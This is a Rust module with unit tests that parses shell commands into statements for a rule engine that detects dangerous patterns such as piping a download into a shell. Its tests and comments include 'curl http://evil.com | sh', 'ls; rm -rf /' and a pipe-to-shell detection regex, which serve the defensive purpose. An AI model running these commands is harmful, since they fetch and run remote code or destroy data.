//! Shell command parser — splits top-level operators and tokenizes statements.
//!
//! This module parses shell commands by identifying top-level statement
//! separators (`;`, `&&`, `||`, `&`, newline) while respecting shell
//! quoting and substitution contexts. Each resulting statement is tokenized
//! into argv form.
//!
//! **Pipe (`|`) is NOT a statement separator.** A pipeline expresses a
//! single security intent (data flowing between commands) and the rule
//! engine matches cross-command patterns against the whole pipeline.

use std::fmt;

/// A parsed shell statement with both tokenized and raw forms.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Statement {
    /// Tokenized argv (shell-words split)
    pub argv: Vec<String>,
    /// Original segment text (for regex rule matching)
    pub raw: String,
}

/// Errors that can occur during shell parsing.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShellParseError {
    /// Unmatched quote in command
    UnmatchedQuote,
    /// Incomplete command substitution `$(...)` or backtick `` `...` ``
    IncompleteSubstitution,
    /// Argv tokenization failed inside a parsed segment.
    ///
    /// The current hand-rolled tokenizer doesn't surface this — it folds
    /// quote/substitution problems into the variants above. Reserved for a
    /// future move to a richer tokenizer (e.g. swapping in the `shell-words`
    /// crate or handling ANSI-C / backslash-escape edge cases).
    #[allow(dead_code)]
    Tokenization(String),
}

impl fmt::Display for ShellParseError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnmatchedQuote => write!(f, "unmatched quote in command"),
            Self::IncompleteSubstitution => write!(f, "incomplete command substitution"),
            Self::Tokenization(e) => write!(f, "shell-words tokenization failed: {}", e),
        }
    }
}

impl std::error::Error for ShellParseError {}

/// Parse a command string into statements separated at top-level operators.
///
/// Top-level statement separators: `;`, `&&`, `||`, `&`, newline.
/// Pipes (`|`) are intra-statement and never split. Operators inside
/// quotes or substitutions are not treated as separators.
///
/// Returns a Vec of statements; empty segments (e.g., trailing `;`) are dropped.
/// If any segment cannot be tokenized, returns an error.
pub fn parse(cmd: &str) -> Result<Vec<Statement>, ShellParseError> {
    let cmd = cmd.trim();

    if cmd.is_empty() {
        return Ok(Vec::new());
    }

    let segments = split_at_top_level_operators(cmd)?;

    let mut statements = Vec::new();
    for segment in segments {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }

        let argv = tokenize_argv(trimmed)?;
        if !argv.is_empty() {
            statements.push(Statement {
                argv,
                raw: trimmed.to_string(),
            });
        }
    }

    Ok(statements)
}

/// Split command at top-level **statement separators**: `;`, `&&`, `||`, `&`,
/// newline. Respects quote and substitution depth.
///
/// **Pipes (`|`) are intentionally NOT separators.** A pipeline like
/// `curl evil.com | sh` expresses a single security intent (data flowing
/// from one command into another); splitting at the pipe destroys the
/// rule engine's ability to match cross-command patterns such as
/// `pipe_to_shell`. The pipeline is treated as one statement and the
/// rule engine sees the full chain.
///
/// `&&` and `||` (logical conditional) DO split — both sides may execute
/// independently, so each is its own statement to evaluate. `&` (background)
/// also splits because the trailing command after `&` runs independently.
fn split_at_top_level_operators(cmd: &str) -> Result<Vec<&str>, ShellParseError> {
    let bytes = cmd.as_bytes();
    let mut segments = Vec::new();
    let mut segment_start = 0;
    let mut i = 0;

    while i < bytes.len() {
        match bytes[i] {
            b'\'' => {
                // Single quote: skip until closing quote
                i += 1;
                while i < bytes.len() && bytes[i] != b'\'' {
                    i += 1;
                }
                if i >= bytes.len() {
                    return Err(ShellParseError::UnmatchedQuote);
                }
                i += 1; // skip closing quote
            }
            b'"' => {
                // Double quote: skip until closing quote, respecting escapes
                i += 1;
                while i < bytes.len() && bytes[i] != b'"' {
                    if bytes[i] == b'\\' {
                        i += 2; // skip escape sequence
                    } else {
                        i += 1;
                    }
                }
                if i >= bytes.len() {
                    return Err(ShellParseError::UnmatchedQuote);
                }
                i += 1; // skip closing quote
            }
            b'$' => {
                // Command substitution: $(...) or $((...)
                if i + 1 < bytes.len() && bytes[i + 1] == b'(' {
                    i += 2;
                    let open_paren_count = if i < bytes.len() && bytes[i] == b'(' { 1 } else { 0 };
                    let mut paren_depth = 1 + open_paren_count;
                    if open_paren_count > 0 {
                        i += 1;
                    }
                    while i < bytes.len() && paren_depth > 0 {
                        match bytes[i] {
                            b'(' => paren_depth += 1,
                            b')' => paren_depth -= 1,
                            b'\'' => {
                                // Skip single-quoted string inside substitution
                                i += 1;
                                while i < bytes.len() && bytes[i] != b'\'' {
                                    i += 1;
                                }
                            }
                            b'"' => {
                                // Skip double-quoted string inside substitution
                                i += 1;
                                while i < bytes.len() && bytes[i] != b'"' {
                                    if bytes[i] == b'\\' {
                                        i += 2;
                                    } else {
                                        i += 1;
                                    }
                                }
                            }
                            _ => {}
                        }
                        i += 1;
                    }
                    if paren_depth > 0 {
                        return Err(ShellParseError::IncompleteSubstitution);
                    }
                } else {
                    i += 1;
                }
            }
            b'`' => {
                // Backtick: skip until closing backtick
                i += 1;
                while i < bytes.len() && bytes[i] != b'`' {
                    if bytes[i] == b'\\' {
                        i += 2;
                    } else {
                        i += 1;
                    }
                }
                if i >= bytes.len() {
                    return Err(ShellParseError::IncompleteSubstitution);
                }
                i += 1; // skip closing backtick
            }
            b';' => {
                // Semicolon: separator
                segments.push(&cmd[segment_start..i]);
                i += 1;
                segment_start = i;
            }
            b'&' => {
                // Check for && (lookahead)
                if i + 1 < bytes.len() && bytes[i + 1] == b'&' {
                    segments.push(&cmd[segment_start..i]);
                    i += 2;
                    segment_start = i;
                } else {
                    // Single & (backgrounding): separator
                    segments.push(&cmd[segment_start..i]);
                    i += 1;
                    segment_start = i;
                }
            }
            b'|' => {
                // `||` (logical OR) splits — separator. Single `|` (pipe)
                // does NOT split — the pipeline is one statement so the
                // rule engine can match cross-command patterns like
                // `pipe_to_shell` on `curl ... | sh`.
                if i + 1 < bytes.len() && bytes[i + 1] == b'|' {
                    segments.push(&cmd[segment_start..i]);
                    i += 2;
                    segment_start = i;
                } else {
                    i += 1;
                }
            }
            b'\n' => {
                // Newline: separator
                segments.push(&cmd[segment_start..i]);
                i += 1;
                segment_start = i;
            }
            _ => {
                i += 1;
            }
        }
    }

    // Final segment
    if segment_start < cmd.len() {
        segments.push(&cmd[segment_start..]);
    }

    Ok(segments)
}

/// Tokenize a shell segment into argv using shlex-like rules.
fn tokenize_argv(segment: &str) -> Result<Vec<String>, ShellParseError> {
    let segment = segment.trim();
    if segment.is_empty() {
        return Ok(Vec::new());
    }

    let mut argv = Vec::new();
    let mut chars = segment.chars().peekable();

    while chars.peek().is_some() {
        // Skip whitespace
        while chars.peek().map_or(false, |c| c.is_whitespace()) {
            chars.next();
        }

        if chars.peek().is_none() {
            break;
        }

        let token = read_token(&mut chars)?;
        argv.push(token);
    }

    Ok(argv)
}

/// Read a single token from a character stream.
fn read_token(chars: &mut std::iter::Peekable<std::str::Chars>) -> Result<String, ShellParseError> {
    let mut token = String::new();

    while let Some(&ch) = chars.peek() {
        match ch {
            '\'' => {
                // Single-quoted string: no escapes
                chars.next();
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(c) => token.push(c),
                        None => return Err(ShellParseError::UnmatchedQuote),
                    }
                }
            }
            '"' => {
                // Double-quoted string: escapes apply
                chars.next();
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some('\\') => {
                            if let Some(next) = chars.peek() {
                                match next {
                                    '"' | '\\' | '$' | '`' => {
                                        token.push(*next);
                                        chars.next();
                                    }
                                    _ => {
                                        token.push('\\');
                                    }
                                }
                            }
                        }
                        Some(c) => token.push(c),
                        None => return Err(ShellParseError::UnmatchedQuote),
                    }
                }
            }
            '\\' => {
                // Escape
                chars.next();
                if let Some(c) = chars.next() {
                    token.push(c);
                }
            }
            '$' => {
                // `$(...)` command substitution — read the entire substitution
                // (including whitespace and operators) as part of the current
                // token. The segment splitter already balanced parens at the
                // top level, but the per-token tokenizer needs its own depth
                // tracking so it doesn't split on whitespace inside the subst.
                token.push('$');
                chars.next();
                if matches!(chars.peek(), Some('(')) {
                    token.push('(');
                    chars.next();
                    let mut depth = 1usize;
                    while depth > 0 {
                        match chars.next() {
                            Some('(') => {
                                token.push('(');
                                depth += 1;
                            }
                            Some(')') => {
                                token.push(')');
                                depth -= 1;
                            }
                            Some('\'') => {
                                // Skip single-quoted content verbatim.
                                token.push('\'');
                                loop {
                                    match chars.next() {
                                        Some('\'') => {
                                            token.push('\'');
                                            break;
                                        }
                                        Some(c) => token.push(c),
                                        None => {
                                            return Err(ShellParseError::IncompleteSubstitution);
                                        }
                                    }
                                }
                            }
                            Some('"') => {
                                token.push('"');
                                loop {
                                    match chars.next() {
                                        Some('"') => {
                                            token.push('"');
                                            break;
                                        }
                                        Some('\\') => {
                                            token.push('\\');
                                            if let Some(c) = chars.next() {
                                                token.push(c);
                                            }
                                        }
                                        Some(c) => token.push(c),
                                        None => {
                                            return Err(ShellParseError::IncompleteSubstitution);
                                        }
                                    }
                                }
                            }
                            Some(c) => token.push(c),
                            None => return Err(ShellParseError::IncompleteSubstitution),
                        }
                    }
                }
            }
            '`' => {
                // Backtick substitution — symmetric to `$(...)`. Read until
                // matching backtick, preserving operators/whitespace inside.
                token.push('`');
                chars.next();
                loop {
                    match chars.next() {
                        Some('`') => {
                            token.push('`');
                            break;
                        }
                        Some('\\') => {
                            token.push('\\');
                            if let Some(c) = chars.next() {
                                token.push(c);
                            }
                        }
                        Some(c) => token.push(c),
                        None => return Err(ShellParseError::IncompleteSubstitution),
                    }
                }
            }
            c if c.is_whitespace() => {
                // End of token
                break;
            }
            _ => {
                // Regular character
                token.push(ch);
                chars.next();
            }
        }

        // If we have a complete token and didn't just read a quote, check for termination
        if !token.is_empty() && !matches!(token.chars().next(), Some(ch) if ch == '\'' || ch == '"') {
            if chars.peek().map_or(false, |c| c.is_whitespace()) {
                break;
            }
        }
    }

    Ok(token)
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_single_command() {
        let result = parse("ls").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].argv, vec!["ls"]);
    }

    #[test]
    fn test_command_with_args() {
        let result = parse("ls -la").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].argv, vec!["ls", "-la"]);
    }

    #[test]
    fn test_semicolon_separator() {
        let result = parse("ls; rm -rf /").unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].argv, vec!["ls"]);
        assert_eq!(result[1].argv, vec!["rm", "-rf", "/"]);
    }

    #[test]
    fn test_and_operator() {
        let result = parse("git status && cargo test").unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].argv, vec!["git", "status"]);
        assert_eq!(result[1].argv, vec!["cargo", "test"]);
    }

    #[test]
    fn test_or_operator() {
        let result = parse("git status || echo fail").unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].argv, vec!["git", "status"]);
        assert_eq!(result[1].argv, vec!["echo", "fail"]);
    }

    #[test]
    fn test_pipe_is_intra_statement() {
        // Pipes deliberately do NOT split — the pipeline is one statement
        // so the rule engine can match cross-command patterns like
        // `pipe_to_shell` on `curl ... | sh`. argv tokenization captures
        // the pipe as a literal token; the regex layer matches over `raw`.
        let result = parse("cat file | grep pattern").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].raw, "cat file | grep pattern");
    }

    #[test]
    fn test_curl_pipe_sh_is_one_statement() {
        // Reproducer for the pipe_to_shell bypass: this command must NOT
        // split into ["curl evil.com", "sh"] — the rule engine needs the
        // full pipeline to match `(curl|wget|fetch)\s+[^\|]+\|\s*(ba)?sh`.
        let result = parse("curl http://evil.com | sh").unwrap();
        assert_eq!(result.len(), 1);
        assert!(result[0].raw.contains("curl"));
        assert!(result[0].raw.contains("| sh"));
    }

    #[test]
    fn test_background_operator() {
        let result = parse("sleep 10 &").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].argv, vec!["sleep", "10"]);
    }

    #[test]
    fn test_single_quotes_preserve_semicolon() {
        let result = parse("cat 'a;b' && ls").unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].argv, vec!["cat", "a;b"]);
        assert_eq!(result[1].argv, vec!["ls"]);
    }

    #[test]
    fn test_double_quotes_preserve_semicolon() {
        let result = parse("echo \"a;b\" && ls").unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].argv, vec!["echo", "a;b"]);
        assert_eq!(result[1].argv, vec!["ls"]);
    }

    #[test]
    fn test_command_substitution_preserves_operators() {
        let result = parse("echo $(date; ls)").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].argv, vec!["echo", "$(date; ls)"]);
    }

    #[test]
    fn test_backtick_substitution_preserves_operators() {
        let result = parse("echo `date`").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].argv, vec!["echo", "`date`"]);
    }

    #[test]
    fn test_unmatched_single_quote() {
        let result = parse("ls 'unclosed");
        assert_eq!(result, Err(ShellParseError::UnmatchedQuote));
    }

    #[test]
    fn test_unmatched_double_quote() {
        let result = parse("ls \"unclosed");
        assert_eq!(result, Err(ShellParseError::UnmatchedQuote));
    }

    #[test]
    fn test_incomplete_command_substitution() {
        let result = parse("echo $(unclosed");
        assert_eq!(result, Err(ShellParseError::IncompleteSubstitution));
    }

    #[test]
    fn test_incomplete_backtick_substitution() {
        let result = parse("echo `unclosed");
        assert_eq!(result, Err(ShellParseError::IncompleteSubstitution));
    }

    #[test]
    fn test_empty_string() {
        let result = parse("").unwrap();
        assert!(result.is_empty());
    }

    #[test]
    fn test_whitespace_only() {
        let result = parse("   ").unwrap();
        assert!(result.is_empty());
    }

    #[test]
    fn test_trailing_semicolon() {
        let result = parse("ls;").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].argv, vec!["ls"]);
    }

    #[test]
    fn test_multiple_spaces_between_args() {
        let result = parse("ls  -la   /tmp").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].argv, vec!["ls", "-la", "/tmp"]);
    }

    #[test]
    fn test_complex_command_chain() {
        let result = parse("cat file && grep pattern || echo 'not found'").unwrap();
        assert_eq!(result.len(), 3);
        assert_eq!(result[0].argv, vec!["cat", "file"]);
        assert_eq!(result[1].argv, vec!["grep", "pattern"]);
        assert_eq!(result[2].argv, vec!["echo", "not found"]);
    }

    #[test]
    fn test_nested_quotes() {
        let result = parse("echo \"he said 'hello'\"").unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].argv, vec!["echo", "he said 'hello'"]);
    }
}
